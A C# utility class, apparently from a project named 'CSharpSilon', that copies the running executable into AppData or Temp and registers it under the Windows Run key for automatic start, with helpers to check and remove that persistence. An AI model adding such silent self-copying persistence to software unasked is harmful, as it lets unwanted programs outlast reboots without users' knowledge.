using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;

namespace CSharpSilon.Utils
{
    public class NormalStartup
    {
        public static void HandleStartup()
        {
            string proc = Process.GetCurrentProcess().ProcessName + ".exe";
            string path = string.Empty;
            try
            {
                path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), proc);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, path, true);
            }
            catch
            {
                path = Path.Combine(Path.GetTempPath(), proc);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, path, true);
            }
            
            using (RegistryKey registryKey =
                   Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                registryKey.SetValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName),
                    $"\"{path}\"");
            }

        }


        public static void DelStartup()
        {
            using (TaskService taskService = new TaskService())
            {
                taskService.RootFolder.DeleteTask(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName), false);
            }
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                registryKey.DeleteValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName));
            }
        }

        public static bool GetStartup()
        {
            bool InStartup;
            try
            {
                TaskCollection tasks;
                using (TaskService taskService = new TaskService())
                {
                    tasks = taskService.RootFolder.GetTasks(
                        new Regex(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)));
                }

                if (tasks.Count != 0)
                {
                    InStartup = true;
                }
                else
                {
                    using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(
                               "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
                               RegistryKeyPermissionCheck.ReadWriteSubTree))
                    {
                        InStartup = registryKey.GetValue(
                            Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)) != null;
                    }
                }
            }
            catch
            {
                InStartup = false;
            }

            return InStartup;
        }
    }
}